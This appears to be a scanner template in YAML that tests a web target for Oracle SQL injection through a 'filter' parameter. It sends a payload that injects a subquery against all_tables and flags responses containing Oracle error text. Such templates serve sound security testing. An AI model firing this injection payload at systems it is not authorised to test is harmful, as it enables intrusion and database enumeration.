id: sqli5-095
name: 'Oracle SQLi in filter'
severity: high
type: active
tags:
  - sqli
  - injection
  - oracle
description: 'Triggers oracle error via filter'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      filter:
        - '1'' AND (SELECT COUNT(*) FROM all_tables)>0--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'ORA-'
          - 'Oracle error'
